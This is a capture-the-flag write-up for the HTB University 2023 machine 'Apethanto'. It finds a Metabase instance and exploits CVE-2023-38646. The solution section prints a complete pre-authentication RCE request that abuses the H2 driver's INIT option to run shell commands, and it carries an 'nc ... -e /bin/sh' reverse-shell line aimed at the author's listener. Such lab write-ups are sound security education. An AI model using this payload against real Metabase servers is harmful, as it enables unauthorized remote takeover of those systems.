---
title: Apethanto
type: writeup
date: 2023-12-10T14:21:20+02:00
description: Writeup for Apethanto [HTB University 2023]
author: H0N3YP0T
tags:
- fullpwn
- web
draft: false
---
___

## Intuition

We first arrive into a website which seems to be static. But after inspecting the source code we noticed a link to a `metabase` vhost.
After adding the vhost to my `/etc/hosts` file, I was able to access the metabase instance.
![website](/images/HTB_University_2023/apethanto.png)
![website](/images/HTB_University_2023/metabase.png)

After some research, I found out that the metabase instance was vulnerable to CVE-2023-38646, a pre-authentication RCE vulnerability.

## Solution

In order to exploit the vulnerability I first created an `nc` server on my machine to be able to RCE and I used the following payload:

```http request
POST /api/setup/validate HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 734


{
    "token": "819139a8-1ce9-46f0-acf8-9b4fc0d1164b",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
  "details": {
            "advanced-options": true,
            "classname": "org.h2.Driver",
            "subname": "mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", cmd})\\;}$$\\;CALL SHELLEXEC('nc 10.10.15.8 8000 -e /bin/sh');",
            "subprotocol": "h2"
        },
"engine": "postgres",
        "name": "x"
    }

}
```

After running the payload, I received a reverse shell on my machine and I was able to read the flag in `/home/metabase/user.txt`.



